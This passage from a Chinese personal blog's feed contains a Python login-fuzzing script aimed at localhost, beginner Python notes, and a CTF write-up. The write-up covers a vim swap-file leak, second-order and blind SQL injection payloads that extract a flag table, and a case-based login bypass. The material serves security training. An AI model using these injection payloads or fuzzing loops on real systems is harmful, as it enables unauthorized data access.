class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">'http://localhost/index.php'</span></span><br><span class="line">kkk = range(<span class="number">10</span>)</span><br><span class="line">yye = []</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">	uu = str(l).zfill(<span class="number">4</span>)</span><br><span class="line">	yye.append(uu)</span><br><span class="line">ii = <span class="string">'abcdef'</span></span><br><span class="line"><span class="keyword">for</span> aa <span class="keyword">in</span> ii:</span><br><span class="line">	<span class="keyword">for</span> bb <span class="keyword">in</span> ii:</span><br><span class="line">		<span class="keyword">for</span> cc <span class="keyword">in</span> ii:</span><br><span class="line">			<span class="keyword">for</span> dd <span class="keyword">in</span> ii:</span><br><span class="line">				tt = aa + bb + cc + dd</span><br><span class="line">				yye.append(tt)</span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> yye:</span><br><span class="line">	a = <span class="string">"u'\u"</span> + l + <span class="string">"'"</span></span><br><span class="line">	ee = eval(a)			</span><br><span class="line">	url_data = <span class="string">"ps=abc!10O0o&amp;id=lightless"</span></span><br><span class="line">	f = urllib.urlopen(url,url_data)</span><br><span class="line">	html = f.read()</span><br><span class="line">	size = sys.getsizeof(html)</span><br><span class="line">	<span class="keyword">if</span> size == <span class="number">475</span> <span class="keyword">or</span> size == <span class="number">494</span> :</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> html</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure></p>
<p>================update in 13/3 2015=============</p>
<p>今天发现一个内置函数，<code>unichr()</code> 生成unicode字符，所以上面的代码根本不需要那么复杂。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1114112</span>):</span><br><span class="line">	<span class="keyword">print</span> unichr(x)</span><br></pre></td></tr></table></figure>
<p>只要用上面这个循环就可生成所有的unicode字符。。。从0 - 1114111，总共有1114112个字符。。。。<br>最后代码成这样。。。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'utf-8'</span>)          <span class="comment">#在py2.7不设置这个会报错。。。</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://localhost/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> l <span class="keyword">in</span> range(<span class="number">1114112</span>):			</span><br><span class="line">	url_data = <span class="string">"ps=abc!10O0o&amp;id=lightless"</span> + unichr(l)</span><br><span class="line">	f = urllib.urlopen(url,url_data)</span><br><span class="line">	html = f.read()</span><br><span class="line">	size = sys.getsizeof(html)</span><br><span class="line">	<span class="keyword">if</span> size == <span class="number">475</span> <span class="keyword">or</span> size == <span class="number">494</span> :</span><br><span class="line">		<span class="keyword">print</span> l</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">print</span> html</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>]]></content>
    <summary type="html">
    <![CDATA[<p><strong>写的第一个python脚本,,,,,</strong><br>]]>
    
    </summary>
    
      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python 入门笔记]]></title>
    <link href="http://lazysheep.cc/2015/02/25/0x14/"/>
    <id>http://lazysheep.cc/2015/02/25/0x14/</id>
    <published>2015-02-25T11:30:16.000Z</published>
    <updated>2015-03-13T06:24:46.000Z</updated>
    <content type="html"><![CDATA[<p><strong>最近在学python,,不过脑子太蠢….什么都不住..只好靠烂笔头了…不过技术宅不用烂笔头,,,用博客..</strong><br><a id="more"></a></p>
<blockquote>
<ul>
<li>Ctrl + L  //清屏;</li>
<li>dir() and help() //这两个可以理解为是帮助菜单….待我理解的更深入的时候再补充;</li>
<li>在help()查看帮助的页面,按p退出;</li>
<li><p>python几个函数的特殊使用方法 :</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">fun1</span><span class="params">(*a)</span>:</span></span><br><span class="line">.．.	<span class="keyword">print</span> a</span><br><span class="line">.．.</span><br><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">fun2</span><span class="params">(**a)</span>:</span></span><br><span class="line">.．.	<span class="keyword">print</span> a</span><br><span class="line">.．.</span><br><span class="line">&gt;&gt;&gt;<span class="function"><span class="keyword">def</span> <span class="title">fun3</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">.．.	<span class="keyword">print</span> a,b,c</span><br><span class="line">.．.</span><br><span class="line">&gt;&gt;&gt;fun1(<span class="number">2</span>,<span class="number">3.0</span>,<span class="string">'a'</span>)</span><br><span class="line">(<span class="number">2</span>, <span class="number">3.0</span>, <span class="string">'a'</span>)</span><br><span class="line">&gt;&gt;&gt;fun2(x=<span class="string">'a'</span>,y=<span class="number">2</span>)</span><br><span class="line">&#123;<span class="string">'y'</span>: <span class="number">2</span>, <span class="string">'x'</span>: <span class="string">'a'</span>&#125;</span><br><span class="line">&gt;&gt;&gt;dd = (<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="number">2</span>)</span><br><span class="line"><span class="prompt">&gt;&gt;&gt; </span>fun3(*dd)</span><br><span class="line">a b <span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;cc = &#123;<span class="string">'a'</span>:<span class="number">1</span>,<span class="string">'b'</span>:<span class="string">'c'</span>,<span class="string">'c'</span>:<span class="number">3</span>&#125;</span><br><span class="line">&gt;&gt;&gt;fun3(**cc)</span><br><span class="line"><span class="number">1</span> c <span class="number">3</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>=2015.3.8= 今天发现了一个好用的函数，，vars()　／／显示出函数运行前储存的所以变量，以字典形式输出．</p>
</li>
<li>import 与 from<br>import sys ≈ from sys import *<br>不同之处在于，import　之后是以 <code>sys.stdout.write(&#39;abc&#39;)</code> 的形式引用，而from 是以 <code>stdout.write(&#39;abc&#39;)</code> 形式引用，，from 有变量重复被覆盖的危险。。</li>
<li>看了很多的代码都是以下面的代码开始运行：<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ce.py</span></span><br><span class="line"><span class="keyword">if</span> __name__ ==  <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">'abc'</span></span><br><span class="line">	.....................</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<p>开始很疑惑，，因为我运行 <strong>name</strong>值都为 ‘<strong>main</strong>‘，那这个语句有什么用。。。现在知道了，加上这个语句之后<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">python</span> <span class="keyword">ce</span>.<span class="keyword">py</span></span><br><span class="line"><span class="keyword">abc</span>                          //直接运行这个脚本，会输出<span class="keyword">abc</span></span><br><span class="line">$<span class="keyword">python</span></span><br><span class="line">&gt;&gt;&gt;import <span class="keyword">ce</span></span><br><span class="line">&gt;&gt;&gt;                              #在别的地方导入这个文件，则不会输出，因为这个时候<span class="keyword">ce</span>.__name__ == <span class="string">'ce'</span></span><br></pre></td></tr></table></figure></p>
<blockquote>
<ul>
<li></li>
</ul>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>最近在学python,,不过脑子太蠢….什么都不住..只好靠烂笔头了…不过技术宅不用烂笔头,,,用博客..</strong><br>]]>
    
    </summary>
    
      <category term="Python" scheme="http://lazysheep.cc/tags/Python/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Week4]]></title>
    <link href="http://lazysheep.cc/2015/02/15/0x13/"/>
    <id>http://lazysheep.cc/2015/02/15/0x13/</id>
    <published>2015-02-15T14:30:12.000Z</published>
    <updated>2015-04-18T13:33:32.000Z</updated>
    <content type="html"><![CDATA[<p><strong>本周题没上周那么容易做了,,第一题我觉得算是misc吧,,第二题是注入,,第三题是代码审计,,</strong></p>
<a id="more"></a>
<p>==================================================write time : 15/2 22:30</p>
<h2 id="0x0A_bAD(Rank:100)">0x0A bAD(Rank:100)</h2><p>链接点进去，除了一个大标题外什么也没有，源码，http头也找不到任何信息，，所以重点就集中在VIM上了，，，不知道你们看到VIM会想到什么，（没用过的肯定什么也想不到），，我想到的是～结尾的备份文件，（有强迫症，所以对～的备份文件印象特别深．），所以试了一下 <a href="http://104.236.171.163/week4/bad/index.php~" target="_blank" rel="external">http://104.236.171.163/week4/bad/index.php~</a> ，不过不行，所以猜测有其他种类的备份文件，然后去谷歌　＇VIM＇　＇备份＇ ＇漏洞＇根据这三个关键词，，找到了，，，最后这样 <a href="http://104.236.171.163/week4/bad/index.php.swp" target="_blank" rel="external">http://104.236.171.163/week4/bad/index.php.swp</a> 把文件下载下来得到 Flag…</p>
<p>不过现在这个链接却是错误的,后来才知道原来是我运气好才做出来了,,百度一下 ‘vim swp’ 后发现备份文件是这样的 <code>.文件名.swp</code></p>
<p>所以正确的题解应该是 <a href="http://104.236.171.163/week4/bad/.index.php.swp" target="_blank" rel="external">http://104.236.171.163/week4/bad/.index.php.swp</a></p>
<p>所以说我前面能做出来只是运气罢了……-_-</p>
<h2 id="0x0B_White(Rank:200)">0x0B White(Rank:200)</h2><p>这题,开始以为是XSS,,不过后面却提示了是注入,而且是在 <a href="http://104.236.171.163/week4/white/message.php" target="_blank" rel="external">http://104.236.171.163/week4/white/message.php</a> 留言页面,,,’title’ 和 ‘content’ 都可以注入…可是注了半天..都是报wrong错误….最后使用了一个笨方法,,构造了这样一个payload : </p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">title=</span><span class="number">20</span>&amp;<span class="variable">content=</span><span class="number">0</span>' <span class="constant">or</span> (ord(mid((select  flag from flag limit <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))  &lt;&gt; <span class="number">101</span>) <span class="constant">or</span> '<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>由于这个方法太过笨拙…就不细说了…</p>
<p>后来得知是二阶注入,,然后去研究,,还是没找出简单的方法….</p>
<p>今天看了writeup后才明白,,,,原来是用户名这里有问题,,</p>
<p>我以前构造的都是 :<br><figure class="highlight julia"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=<span class="number">2</span><span class="char">','</span>sdf<span class="char">','</span>afsa')<span class="comment">#&amp;content=ag</span></span><br></pre></td></tr></table></figure></p>
<p>最后一部分..就是上面payload中’afsa’这里,,,提示错误,是因为没有 afsa 用户,,所以这里要改成当前用户,,然后就可以注入成功了,,,构造payload :<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title=x',(<span class="operator"><span class="keyword">select</span> flag <span class="keyword">from</span> flag <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="string">'当前用户名'</span>)#&amp;content=<span class="number">12</span></span></span><br></pre></td></tr></table></figure></p>
<p>Get Flag !<br>//    22/2 20:00 modify</p>
<h2 id="0x0C_懒得起名字了(Rank:200)">0x0C 懒得起名字了(Rank:200)</h2><p>这题首先查源码,查HTTP头,,然后在HTTP头中发现</p>
<p><code>tips    Why not try .bak?</code></p>
<p>然后通过 <a href="http://104.236.171.163/week4/noname/index.php.bak" target="_blank" rel="external">http://104.236.171.163/week4/noname/index.php.bak</a></p>
<p>下载源码,,没PHP基础的就无解了….有php基础的然后就是读源代码…发现输入都过滤了…所以这题应该不是注入题….源码中给出了一个用户名 ‘lightless’ 和密码 ‘abc!10O0o’</p>
<p>这题我们只知道lightless这一个用户名…可是用这个用户登陆又会提示 <code>you account is blocked</code> </p>
<p>而且又没法注入,,所以这个时候我的想法是…有什么字符,mysql会忽略….php却不会…然后尝试url编码….全部跑了一遍都不行…</p>
<p>最后随便试了一下lightlesS 登陆….</p>
<p>Get Flag!!</p>
<p>简直……..只能怪自己学艺不精……</p>
<p>=============================================</p>
<p>最后一次集训了….说说感受….在这几次集训中…学到了很多…发现了很多不足…也学会了一些猥琐流…收获很大….对于这是最后一次了…非常遗憾…</p>
]]></content>
    <summary type="html">
    <![CDATA[<p><strong>本周题没上周那么容易做了,,第一题我觉得算是misc吧,,第二题是注入,,第三题是代码审计,,</strong></p>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://lazysheep.cc/tags/CTF/"/>
    
      <category term="SQLi" scheme="http://lazysheep.cc/tags/SQLi/"/>
    
      <category term="代码审计" scheme="http://lazysheep.cc/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="H-blog" scheme="http://lazysheep.cc/categories/H-blog/"/>
    
  </entry>
  
</feed>